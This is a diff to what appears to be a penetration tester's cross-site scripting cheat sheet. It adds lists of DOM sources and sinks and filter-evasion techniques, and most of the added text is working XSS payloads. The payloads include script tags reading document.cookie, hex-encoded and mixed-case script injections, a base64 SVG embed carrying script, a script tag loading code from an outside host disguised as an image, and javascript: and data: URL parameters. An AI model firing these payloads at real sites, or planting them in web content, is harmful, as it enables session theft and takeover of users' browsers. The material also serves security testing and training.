@@ -33,6 +33,44 @@ nestedwindow.opener.document.write("write to parent into");//
 setTimeout(function(){alert("call < function after > milliseconds",15000);//
 setInterval(alert("call < stored function every > milliseconds",15000);//
 
+Source: An input that could be controlled by an external (untrusted) source
+document.URL
+document.documentURI
+document.URLUnencoded (IE 5.5 or later Only)
+document.baseURI
+location
+location.href
+location.search
+location.hash
+location.pathname
+document.cookie
+document.referrer
+window.name
+history.pushState()
+history.replaceState()
+localStorage
+sessionStorage
+
+Sink: A potentially dangerous method that could lead to a vulnerability
+eval
+Function
+setTimeout
+setInterval
+setImmediate
+execScript
+crypto.generateCRMFRequest
+ScriptElement.src
+ScriptElement.text
+ScriptElement.textContent
+ScriptElement.innerText
+anyTag.onEventName
+document.write
+document.writeln
+anyElement.innerHTML
+Range.createContextualFragment
+window.location
+document.location
+
 REFLECTED XSS
 <script>alert(document.domain)</script>
 <iframe>document.cookie</iframe>
@@ -78,6 +116,9 @@ XSS filter bypass methods
 HEX encoding
 Obfuscation
 magic_quotes_gpc=ON bypass (php-specific)
+SVG embedding
+rename JavaScript payload file to an image
+b64-endcoding javascript reflected paramater
 
 HEX encoding
 ?param=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%28%29%29%3b%3c%2f%73%63%72%69%70%74%3e
@@ -86,3 +127,20 @@ HEX encoding
 Obfuscation
 "><sCrIpT>alert('turtles');</ScRiPt>
 	-javascript case-insensitive
+	
+SVG Embedding
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+	
+Javascript source saved in image file
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+
+
+B64-encoded JavaScript Reflected Parameter
+/?param=javascript:alert(document.cookie)
+ /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+	
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+Advanced Payloads
+http://www.xss-payloads.com/payloads-list.html?a#category=all
